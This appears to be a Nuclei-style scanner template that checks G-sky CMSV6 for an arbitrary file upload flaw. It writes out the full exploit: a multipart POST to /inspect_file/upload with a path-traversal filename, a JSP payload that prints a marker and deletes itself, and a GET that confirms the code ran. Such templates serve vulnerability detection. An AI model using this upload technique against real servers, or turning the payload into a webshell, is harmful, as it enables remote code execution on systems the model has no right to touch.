http:
    - extractors:
        - group: 1
          internal: true
          name: filePath
          part: body_1
          regex:
            - /upload/software/(\d+_Sec)
          type: regex
      matchers:
        - dsl:
            - status_code_1 == 200 && contains_all(body_2, 'SecExplorer666')
          type: dsl
      raw:
        - |
          POST /inspect_file/upload HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
          Accept-Encoding: gzip, deflate
          Accept: */*
          Connection: close
          Content-Length: 226
          Content-Type: multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b

          --2e7688d712bcc913201f327059f9976b
          Content-Disposition: form-data; name="uploadFile"; filename="../Sec.jsp"
          Content-Type: application/octet-stream

          <% out.println("SecExplorer666");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
          --2e7688d712bcc913201f327059f9976b--
        - |
          GET /upload/software/{{filePath}}.jsp HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
id: G-sky-CMSV6-inspect_file-uploadfile
info:
    author: pitaya
    name: G-sky-CMSV6-inspect_file-uploadfile
    severity: high
    tags:
        - Servlet
